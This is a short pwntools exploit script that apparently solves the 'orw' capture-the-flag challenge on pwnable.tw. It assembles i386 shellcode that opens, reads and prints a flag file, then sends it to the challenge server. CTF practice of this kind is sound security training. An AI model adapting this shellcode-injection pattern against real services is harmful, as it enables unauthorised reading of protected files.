from pwn import *

context.binary = exe = ELF('./orw')

shell = asm(shellcraft.i386.linux.open('/home/orw/flag') + shellcraft.i386.linux.read('eax', 0x804a500, 100) + shellcraft.i386.linux.write(1, 0x804a500, 100))

# io = process()
# gdb.attach(io, api=True)
io = remote('chall.pwnable.tw', 10001)

io.recvuntil(b'shellcode:')
io.sendline(shell)
io.interactive()